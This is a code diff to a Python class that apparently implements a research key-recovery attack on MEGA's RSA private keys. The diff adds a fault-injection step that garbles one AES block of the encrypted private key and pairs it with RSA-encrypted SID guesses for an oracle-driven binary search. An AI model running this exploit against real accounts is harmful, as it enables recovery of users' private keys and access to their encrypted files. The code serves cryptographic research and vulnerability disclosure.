@@ -14,6 +14,7 @@ from shared.constants.mega_crypto import *
 from Crypto.Util.number import isPrime
 
 BRUTEFORCE_THRESHOLD = 1 << 20
+U_GARBLE_BLOCK_INDEX = 39
 
 try:
     # Sage is only needed for the lattic attack part of the key recovery attack
@@ -73,17 +74,19 @@ class MegaRSAKeyRecoveryAttack():
     bits) and recover the missing part of the RSA factor using a lattice attack.
     """
 
-    def __init__(self, pubk, do_ct_len_encode=False, bruteforce_threshold=BRUTEFORCE_THRESHOLD):
+    def __init__(self, pubk, privk_enc, do_ct_len_encode=False, bruteforce_threshold=BRUTEFORCE_THRESHOLD):
         """
         Maintain the interval (low, up) in which the factor q is located.
         Since there is no overflow, the invariant up >= low always holds.
 
         :param pubk: public key
+        :param privk_enc: AES-encrypted private key
         :param do_ct_len_encode: optional Boolean, if set, do length encoding on
             ciphertext
         """
 
         self.pubk = pubk
+        self.privk_encrypted = privk_enc
         self.n, self.e = pubk
         self.do_ct_len_encode = do_ct_len_encode
         self.oracle_queries = 0
@@ -97,14 +100,34 @@ class MegaRSAKeyRecoveryAttack():
         self.remaining_bits = floor_int_div(self.n.bit_length(), 6)
         self.bruteforce_threshold = bruteforce_threshold
 
-    def get_next_sid(self):
+        self._inject_fault()
+
+    def _inject_fault(self):
+        u_garble = randbelow(1 << 128)
+        garbled_wrapped_key = bytearray(self.privk_encrypted[:])
+        u_garble_bytes = int_to_bytes(u_garble).rjust(AES_BLOCK_BYTE_SIZE, b"\x00")
+
+        start = AES_BLOCK_BYTE_SIZE * U_GARBLE_BLOCK_INDEX
+        for i in range(AES_BLOCK_BYTE_SIZE):
+            garbled_wrapped_key[start+i] ^= u_garble_bytes[i]
+        self.garbled_privk_enc = bytes(garbled_wrapped_key)
+
+    def get_next_wrapped_key_and_ciphertext(self):
         """
-        Return the next encrypted SID for the binary search for q
+        Return the next encrypted SID and wrapped key for the binary search for q
         """
         sid = (self.low + self.up) >> 1
         self.last_sid = sid
         sid_bytes = int_to_bytes(sid)
-        return rsa_encrypt(sid_bytes, self.pubk, do_pad=False, do_ct_len_encode=self.do_ct_len_encode)
+        rsa_ct = rsa_encrypt(
+            sid_bytes,
+            self.pubk,
+            do_pad=False,
+            do_ct_len_encode=self.do_ct_len_encode
+        )
+        wrapped_key = self.garbled_privk_enc
+
+        return wrapped_key, rsa_ct
 
 
     def feed_response(self, r):
